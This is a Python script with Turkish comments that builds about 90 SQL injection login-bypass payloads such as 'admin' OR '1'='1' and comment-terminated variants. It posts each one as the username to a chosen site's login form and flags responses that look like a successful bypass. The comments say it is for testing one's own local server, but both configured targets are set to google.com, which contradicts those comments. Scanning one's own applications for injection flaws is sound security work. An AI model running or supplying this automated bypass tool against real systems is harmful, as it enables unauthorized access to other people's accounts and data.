import requests
import time
from requests.exceptions import RequestException

# 1. ADRES TANIMLAMALARI (Hata almamak için IP ve portları tam yazmalısın)
SITELER = {
    "site1": "https://google.com",  # Localhost Flask/Django vb. örneği
    "site2": "https://google.com"     # Kendi yerel sunucunun tam IP'si
}

# 2. DİNAMİK OR PAYLOAD ÜRETİCİ (Giriş paneli için geniş test listesi)
base_payloads = [
    "admin", 
    "admin' OR '1'='1", 
    "admin' --", 
    "' OR 1=1 --", 
    "admin' OR 'a'='a",
    "' OR 'xyz'='xyz' --",
    "admin' OR 1=1#",
    "' OR 1=1/*",
    "admin' OR 1=1-",
    "admin' or '1'='1'--",
    "admin' or 1=1 or ''='",
    "' or 1=1 or ''='",
    "admin' or '1'='1'/*",
    "1' or '1'='1"
]

# Listeyi döngülerle türeterek 90+ farklı varyasyona ulaştırıyoruz
test_payloads = list(base_payloads)
karakterler = ["1", "a", "x", "true", "xyz", "99", "0"]
operatorler = ["=", "!=", "<>"]

for char in karakterler:
    for op in operatorler:
        test_payloads.append(f"admin' OR '{char}'{op}'{char}")
        test_payloads.append(f"' OR '{char}'{op}'{char}' --")
        test_payloads.append(f"admin' or {char}{op}{char}#")
        test_payloads.append(f"' or {char}{op}{char}/*")

# Sadece ilk 90 tanesini kesinleştirmek için listeyi sınırlayabiliriz
test_payloads = test_payloads[:90]

print(f"📦 Toplam {len(test_payloads)} adet mantıksal test girdisi hazırlandı.")

def test_baslat(site_url):
    print(f"🌐 [ {site_url} ] adresi test ediliyor...\n")
    
    sayac = 1
    for payload in test_payloads:
        # Kendi sitenin formundaki 'name' etiketlerine göre burayı düzenle!
        veri = {
            "username": payload,
            "password": "sifre_denemesi_123"
        }
        
        try:
            # timeout=3 bilgisayarının donmasını/paniklemesini önler
            response = requests.post(site_url, data=veri, timeout=3)
            
            print(f"[{sayac}/90] ➔ Girdi: [ {payload} ] | Durum: {response.status_code}")
            
            # Başarılı girişte sitenin verdiği tepki kelimelerini buraya ekle
            if "dashboard" in response.url or "hosgeldiniz" in response.text.lower() or "admin" in response.url:
                print("🚨 ZAFİYET TESPİT EDİLDİ: Bu girdi ile giriş bypass edildi!\n")
            else:
                print("✅ Reddedildi.\n")
                
        except RequestException as e:
            print(f"❌ Sunucu bağlantı hatası (Sunucu adresi yanlış veya kapandı): {e}\n")
            break
            
        sayac += 1
        # Sunucunun ve modemin işlemcisini şişirmemek için her istek arası bekliyoruz
        time.sleep(0.5)

    print("Test tamamlandı.")

# 3. KULLANICI SEÇİMİ
secim = input("Hangi siteyi test etmek istersin? (site1 / site2): ").strip().lower()

if secim in SITELER:
    test_baslat(SITELER[secim])
else:
    print("Geçersiz seçim! Lütfen 'site1' veya 'site2' yazın.")
